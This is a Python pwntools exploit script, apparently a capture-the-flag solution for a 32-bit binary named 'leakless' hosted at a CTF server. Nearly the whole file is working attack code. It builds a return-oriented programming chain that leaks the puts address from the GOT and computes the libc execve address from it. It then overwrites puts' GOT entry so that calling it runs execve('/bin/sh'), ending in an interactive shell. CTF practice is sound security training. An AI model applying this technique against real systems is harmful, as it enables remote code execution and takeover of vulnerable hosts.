#!/usr/bin/env python
from pwn import *

p_p_p_ret = 0x80486b9
p_p_ret = 0x80486ba
p_ret = 0x80483ad

plt_read = 0x80483c0
plt_puts = 0x80483f0

got_puts = 0x804a018

buf = writable = 0x804a800
str_timeout = 0x80486e0

libc_execve = 0xf7e96350
libc_binsh  = 0xf7f538cf

libc_execve = 0xf7e9a350
libc_binsh = 0xf7f578cf


payload  = cyclic(cyclic_find("taaa"))
payload += p32(plt_puts) + p32(p_ret) + p32(str_timeout)
payload += p32(plt_puts) + p32(p_ret) + p32(got_puts)
payload += p32(plt_read) + p32(p_p_p_ret) + p32(0x0) + p32(buf) + p32(0x8)
payload += p32(plt_read) + p32(p_p_p_ret) + p32(0x0) + p32(got_puts) + p32(0x4)
payload += p32(plt_puts) + p32(0xc01db7e3) + p32(buf) + p32(0) + p32(0)

payload  = payload.ljust(0x100)

print len(payload)
assert len(payload) <= 0x100

with open("payload", "wb") as out:
    out.write(payload)
    out.close()

if len(sys.argv) < 2 :
    p = process("./leakless")
    libc = ELF("/lib32/libc.so.6")
else :
    p = remote("ctf.osusec.org", sys.argv[1])
    libc = ELF("libc6_2.26-0ubuntu2.1_i386.so") ## Found with blukat.me
p.send(payload)
p.recvuntil("Timeout!\n")
leak = p.recvn(4)
s = p.recvrepeat(1)
print hex(u32(leak))
#if len(sys.argv) < 2 :
    #libc_execve = u32(leak) + 0xf7e9a350 - 0xf7e43360
#else :
libc_execve= u32(leak) + libc.symbols['execve'] - libc.symbols['puts']

p.send("/bin/sh" + "\x00")
p.send(p32(libc_execve))
p.interactive()
